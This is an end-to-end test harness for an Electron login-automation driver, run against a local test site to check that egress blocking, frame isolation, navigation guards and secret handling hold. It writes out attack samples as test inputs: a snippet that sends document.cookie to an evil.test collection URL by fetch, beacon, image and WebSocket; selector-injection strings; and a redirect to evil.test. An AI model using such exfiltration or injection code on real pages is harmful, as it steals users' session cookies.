// The e2e harness: an Electron main process that drives the real ElectronSessionDriver against the
// local test site. Each scenario returns plain data for the Playwright spec to assert on.
// Every *.test host resolves to 127.0.0.1, and only the test site's own certificate is trusted.
//
// Environment switches, for the variants the specs compare:
//   E2E_NO_SITE_ISOLATION=1  cross-origin iframes share the main frame's renderer process
//   E2E_NO_HARDENING=1       skip hardenProcess(), to check the DNS-prefetch test isn't vacuous

import { X509Certificate } from 'node:crypto'
import { mkdtempSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { type AdapterManifest, parseManifest, SecretValue, SiteAdapterError } from '@siteadapter/core'
import { app, BrowserWindow, type Cookie, session, type WebFrameMain } from 'electron'
import { type BlockedRequest, createElectronSessionDriver, hardenProcess } from '../../src/index'
import { startTestSite, type TestSite } from './server'

if (process.env.E2E_NO_HARDENING === undefined) hardenProcess(app)
if (process.env.E2E_NO_SITE_ISOLATION !== undefined) {
  app.commandLine.appendSwitch('disable-site-isolation-trials')
  app.commandLine.appendSwitch('disable-features', 'IsolateOrigins,site-per-process')
}
app.commandLine.appendSwitch('host-resolver-rules', 'MAP *.test 127.0.0.1')
app.setPath('userData', mkdtempSync(join(tmpdir(), 'siteadapter-e2e-profile-')))
app.on('window-all-closed', () => {})
const readyWhenHardened = app.isReady()

const CANARY = 'canary-Pw9!x "q'

const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms))

async function until<T>(read: () => T | undefined, ms = 5000): Promise<T | undefined> {
  const deadline = Date.now() + ms
  for (;;) {
    const value = read()
    if (value !== undefined || Date.now() > deadline) return value
    await sleep(50)
  }
}

function manifest(site: TestSite): AdapterManifest {
  return parseManifest({
    schemaVersion: 1,
    id: 'e2e',
    name: 'E2E',
    version: '0.0.1',
    description: 'The local test site',
    home: `${site.url('site.test')}/`,
    navigation: [site.url('site.test'), site.url('login.test')],
    egress: ['site.test', 'login.test'],
    secrets: {},
    session: { cookieDomains: ['site.test'], probe: { kind: 'cookie', name: 'sid' } },
    auth: { steps: [{ op: 'assertLoggedIn' }] },
    tools: [{ name: 'noop', title: 'Noop', description: 'Nothing', sideEffect: 'read' }],
  })
}

type Outcome<T> = { ok: T } | { error: { stage: string; errorClass: string } | { other: string } }

async function settle<T>(work: Promise<T>): Promise<Outcome<T>> {
  try {
    return { ok: await work }
  } catch (error) {
    if (error instanceof SiteAdapterError)
      return { error: { stage: error.stage, errorClass: error.errorClass } }
    return { error: { other: String(error) } }
  }
}

function windowAt(prefix: string): BrowserWindow | undefined {
  return BrowserWindow.getAllWindows().find(
    (w) => !w.isDestroyed() && w.webContents.getURL().startsWith(prefix),
  )
}

function subframeWithOrigin(prefix: string, origin: string): WebFrameMain | undefined {
  const contents = windowAt(prefix)?.webContents
  if (contents === undefined) return undefined
  return contents.mainFrame.framesInSubtree.find(
    (frame) => frame.origin === origin && frame.frameTreeNodeId !== contents.mainFrame.frameTreeNodeId,
  )
}

function cookieSummary(cookies: Cookie[]) {
  return cookies
    .map((c) => ({
      name: c.name,
      domain: c.domain,
      path: c.path,
      hostOnly: c.hostOnly,
      secure: c.secure,
      httpOnly: c.httpOnly,
      sameSite: c.sameSite,
      session: c.session,
    }))
    .sort((a, b) => a.name.localeCompare(b.name))
}

async function setup() {
  const site = await startTestSite()
  const trusted = (pem: string) => {
    try {
      return new X509Certificate(pem).fingerprint256 === site.fingerprint
    } catch {
      return false
    }
  }
  for (const partition of ['persist:auth:e2e', 'persist:tool:e2e']) {
    session.fromPartition(partition).setCertificateVerifyProc((request, callback) => {
      callback(trusted(request.certificate.data) ? 0 : -2)
    })
  }
  const blocked: BlockedRequest[] = []
  const driver = await createElectronSessionDriver(manifest(site), {
    onBlocked: (b) => blocked.push(b),
    typingDelayMs: 15,
    stepTimeoutMs: 10_000,
  })
  const login = site.url('site.test', '/login')
  const evilRequests = () => site.requests.filter((r) => r.host.endsWith('evil.test'))
  // Any request anywhere, other than the two forms a canary is meant for, that carries it.
  const canaryLeaks = () => {
    const encoded = new URLSearchParams({ x: CANARY }).toString().slice(2)
    return site.posts.filter(
      (p) => p.body.includes(encoded) && p.host !== 'login.test' && p.path !== '/session-code',
    )
  }

  async function openLogin() {
    const page = await driver.openAuthPage()
    await page.goto(login)
    // Frames load after the main document; wait in Node, as the interpreter does.
    for (let i = 0; i < 100 && (await page.inspect('#password')) === null; i++) await sleep(50)
    return page
  }

  return {
    info: async () => ({
      electron: process.versions.electron,
      chrome: process.versions.chrome,
      readyWhenHardened,
      siteIsolation: process.env.E2E_NO_SITE_ISOLATION === undefined,
    }),

    inspect: async () => {
      const page = await openLogin()
      const result = {
        origins: { site: site.url('site.test'), login: site.url('login.test') },
        user: await page.inspect('#user'),
        hidden: await page.inspect('#hidden'),
        search: await page.inspect('#q'),
        sameOriginFrame: await page.inspect('#code'),
        crossOriginFrame: await page.inspect('#password'),
        missing: await page.inspect('#nothing'),
        invalidBreakout: await settle(page.inspect("'); window.__pwned = 1; ('")),
        validBreakout: await settle(page.inspect(`[data-x="'); window.__pwned = 1; ('"]`)),
        pwned: await windowAt(login)?.webContents.executeJavaScript('window.__pwned !== undefined'),
        textPresent: await page.textPresent('Continue'),
        textAbsent: await page.textPresent('Welcome back'),
      }
      await page.close()
      return result
    },

    typeInMainFrame: async () => {
      const page = await openLogin()
      await page.focus('#user')
      await page.type('nick@example.test')
      await page.click('#login-submit')
      const post = await until(() => site.posts.find((p) => p.host === 'site.test' && p.path === '/session'))
      await page.close()
      return { post }
    },

    typeSecretInSameOriginFrame: async () => {
      const page = await openLogin()
      await page.focus('#code')
      const secret = SecretValue.fromString(CANARY)
      await page.type(secret)
      secret.dispose()
      await page.click('#code-submit')
      const post = await until(() => site.posts.find((p) => p.path === '/session-code'))
      await page.close()
      return { post, leaks: canaryLeaks() }
    },

    typeSecretInCrossOriginFrame: async () => {
      const page = await openLogin()
      const focus = await settle(page.focus('#password'))
      const secret = SecretValue.fromString(CANARY)
      const typed = await settle(page.type(secret))
      secret.dispose()
      const frame = subframeWithOrigin(login, site.url('login.test'))
      const valueLength = await frame?.executeJavaScript(`document.querySelector('#password').value.length`)
      const click = await settle(page.click('#password-submit'))
      const post = await until(() => site.posts.find((p) => p.host === 'login.test'), 1500)
      await page.close()
      return { focus, typed, click, post: post ?? null, valueLength, leaks: canaryLeaks() }
    },

    navigationGuard: async () => {
      const page = await openLogin()
      const clicked = await settle(page.click('#escape'))
      await sleep(500)
      const afterClick = await settle(page.inspect('#user'))
      const clickCommitted = page.committedUrls()
      await page.close()

      const second = await driver.openAuthPage()
      const target = encodeURIComponent(site.url('evil.test', '/landing'))
      const redirect = await settle(second.goto(site.url('site.test', `/redirect?to=${target}`)))
      const redirectCommitted = second.committedUrls()
      await second.close()

      const third = await driver.openAuthPage()
      const offList = await settle(third.goto(site.url('evil.test', '/')))
      await third.close()
      return {
        clicked,
        afterClick,
        clickCommitted,
        redirect,
        redirectCommitted,
        offList,
        evil: evilRequests(),
      }
    },

    egress: async () => {
      const page = await driver.toolPage()
      const evil = site.url('evil.test', '/collect')
      const refused = await settle(page.fetch(evil))
      const attempts = await settle(
        page.evaluate(
          `(async () => {
            const outcome = {}
            try { await fetch(args.evil + '?via=fetch&c=' + document.cookie, { mode: 'no-cors' }); outcome.fetch = 'sent' } catch { outcome.fetch = 'failed' }
            outcome.beacon = navigator.sendBeacon(args.evil + '?via=beacon', 'x')
            await new Promise((resolve) => { const img = new Image(); img.onload = img.onerror = resolve; img.src = args.evil + '?via=img' })
            await new Promise((resolve) => { const ws = new WebSocket(args.ws); ws.onerror = ws.onopen = resolve })
            return outcome
          })()`,
          { evil, ws: site.url('evil.test', '/ws').replace('https:', 'wss:') },
        ),
      )
      const allowed = await settle(page.fetch('/echo'))
      await sleep(500)
      return { refused, attempts, allowed, blocked: [...blocked], evil: evilRequests() }
    },

    hints: async () => {
      const page = await driver.toolPage()
      await page.goto(site.url('site.test', '/hints'))
      await sleep(1500)
      return {
        evilConnections: site.connections.filter((name) => name.endsWith('evil.test')),
        evil: evilRequests(),
      }
    },

    handoff: async () => {
      const tool = await driver.toolPage()
      await tool.evaluate(
        `(document.cookie = 'planted=from-tool; Path=/; Secure', localStorage.setItem('planted', 'x'))`,
      )
      const auth = await driver.openAuthPage()
      await auth.goto(site.url('site.test', '/set-session'))
      await driver.handoff(['site.test'], [{ origin: site.url('site.test'), keys: ['token', 'absent'] }])
      const echoed = await tool.fetch('/echo')
      const token = await tool.evaluate(`localStorage.getItem('token')`)
      const authCookies = cookieSummary(await session.fromPartition('persist:auth:e2e').cookies.get({}))
      const toolCookies = cookieSummary(await session.fromPartition('persist:tool:e2e').cookies.get({}))
      const authPlantedStorage = await windowAt(
        site.url('site.test', '/set-session'),
      )?.webContents.executeJavaScript(`localStorage.getItem('planted')`)
      const redaction = await driver.sessionCookieValues(['site.test'])
      await auth.close()
      return { echoed, token, authCookies, toolCookies, authPlantedStorage, redaction }
    },

    handToUser: async () => {
      const page = await driver.openAuthPage()
      await page.goto(site.url('site.test', '/'))
      const window = windowAt(site.url('site.test', '/'))
      const hiddenBefore = window?.isVisible() === false
      const handed = page.handToUser('Finish logging in, then close this window')
      await sleep(200)
      const shown = window?.isVisible() === true
      const title = window?.getTitle()
      window?.close()
      await handed
      const hiddenAfter = window?.isVisible() === false
      const aliveAfterClose = window?.isDestroyed() === false
      await page.close()
      return {
        hiddenBefore,
        shown,
        title,
        hiddenAfter,
        aliveAfterClose,
        destroyedByPageClose: window?.isDestroyed(),
      }
    },

    close: async () => {
      await driver.toolPage()
      await driver.openAuthPage()
      await driver.close()
      return { windows: BrowserWindow.getAllWindows().filter((w) => !w.isDestroyed()).length }
    },
  }
}

const ready = app.whenReady().then(setup)
;(globalThis as { harness?: unknown }).harness = ready
